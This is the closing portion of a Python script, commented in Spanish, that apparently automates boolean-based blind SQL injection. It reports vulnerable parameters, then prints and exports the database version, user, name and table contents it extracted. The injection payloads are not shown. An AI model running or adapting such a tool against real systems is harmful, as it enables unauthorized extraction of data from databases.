    # Si se han detectado parámetros vulnerables, se procede con el ataque Blind SQLi
    resultados_bbdd_obtenidos = {}
    if is_vulnerable_blind_booleano_res:
        print("[!] Se han detectado los siguientes parámetros vulnerables a ataques de Blind SQLi Basados en Booleanos/Condicionales:")
        for parametro_vulnerable in parametros_vulnerables_blind_booleano:
            print('\t' + parametro_vulnerable)

        resultados_bbdd_obtenidos = ataque_blind_booleano(req_sesion, url, metodo, parametros_valores, parametros_vulnerables_blind_booleano, resultado_valido)

        # Una vez se obtienen los resultados de la base de datos, se imprimen por pantalla y se exportan en un archivo
        print('\n\n-------- Información recuperada de la base de datos --------\n')
        print('> Versión de la base de datos:')
        print('\t' + resultados_bbdd_obtenidos['version de la base de datos'])
        print('> Usuario de la base de datos:')
        print('\t' + resultados_bbdd_obtenidos['usuario actual'])
        print('> Nombre de la base de datos:')
        print('\t' + resultados_bbdd_obtenidos['nombre de la base de datos'])

        print('> Resultados de las tablas recuperadas:')
        for tabla in resultados_bbdd_obtenidos['tablas'].keys():
            print('\t---' + tabla + '---')
            for columna in resultados_bbdd_obtenidos['tablas'][tabla].keys():
                print('\t\t' + columna)
                print('\t', end="")
                for valor in resultados_bbdd_obtenidos['tablas'][tabla][columna]:
                    print("\t" + valor, end="")
                print('\n')

        exportar_resultados(resultados_bbdd_obtenidos)
    else:
        print("[!] No se ha encontrado ningún parámetro vulnerable a ataques de Blind SQLi :(")

if __name__ == "__main__":
    ejecucion_programa()
